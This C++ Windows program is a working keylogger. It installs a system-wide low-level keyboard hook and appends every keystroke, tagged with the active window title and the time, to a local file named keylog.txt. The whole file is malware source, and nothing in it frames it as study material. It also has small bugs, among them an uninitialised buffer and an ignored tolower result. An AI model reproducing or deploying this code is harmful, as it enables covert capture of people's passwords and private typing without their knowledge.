#include <Windows.h>
#include <time.h>
#include <iostream>
#include <string>
#include <cstdio>
#include <stdio.h>
#include <ostream>
#include <fstream>

#pragma warning (disable:4996)
#pragma warning (disable:4703)
//#pragma warning (disable:1120)
//#pragma warning (disable:2001)

//#include <chrono>
//using namespace std::chrono;
//#include "date/date.h"
//# include <h-char-sequence> new-line
#include "iostream"
using namespace std;
//using date::operator<<;
//using namespace date;
ofstream file;
int Save(int key);

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);

HHOOK hook;

KBDLLHOOKSTRUCT kbStruct;




//extern char prevProg[256];

int Save(int key)
{

	//extern
		char prevProg[256];
	if (key == 1 || key == 2)
	{
		return 0;
	}
	HWND foreground = GetForegroundWindow();

	DWORD threadId;
	HKL keyboardLayout;
	if (foreground)
	{
		threadId = GetWindowThreadProcessId(foreground, NULL);
		keyboardLayout = GetKeyboardLayout(threadId);

		char crrProg[256];

		GetWindowTextA(foreground, crrProg, 256);

		if (strcmp(crrProg, prevProg) != 0)
		{
			strcpy_s(prevProg, crrProg);
			time_t t = time(NULL);
			struct tm* tm = localtime(&t);
			char c[64];
			strftime(c, sizeof(c), "%c", tm);


			

			file << "\n\n\n[Program: " << crrProg << "DateTime:" << c << "]";


		}


	}
	cout << key << endl;
	if (key == VK_BACK)
		file << " ";
	else if (key == VK_RETURN)
		file << "\n";
	else if (key == VK_SPACE)
		file << " ";
	else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT)
		file << "[SHIRT]";
	else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL)
		file << "[CTRL]";
	else if (key == VK_ESCAPE)
		file << "[ESC]";
	else if (key == VK_END)
		file << "[END]";
	else if (key == VK_HOME)
		file << "[HOME]";
	else if (key == 190 || key == 110)
		file << ".";
	else if (key == 189 || key == 109)
		file << "-";
	else if (key == 190 || key == 110)
		file << ".";
	else if (key == 20)
		file << "[CAPS]";
	else
	{
		char crrKey;
		bool lower = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0
			|| (GetKeyState(VK_LSHIFT) & 0x1000) != 0
			|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
		{
			lower = !lower;

		}
		crrKey = MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, keyboardLayout);
		if (!lower)
		{
			tolower(crrKey);
		}
		file << char(crrKey);
	}

	file.flush();
	return 0;


}
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		if (wParam == WM_KEYDOWN)
		{
			kbStruct = *((KBDLLHOOKSTRUCT*)lParam);
			Save(kbStruct.vkCode);
		}
	}
	return CallNextHookEx(hook, nCode, wParam, lParam);
}
int main()
{
	file.open("keylog.txt", ios_base::app);
	ShowWindow(FindWindowA("ConsoleWindowsClass", NULL), 1);

	if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		MessageBox(NULL, L"wrong", L"error", MB_ICONERROR);
	}
	MSG message;
	while (true)
	{
		GetMessage(&message, NULL, 0, 0);
	}

}







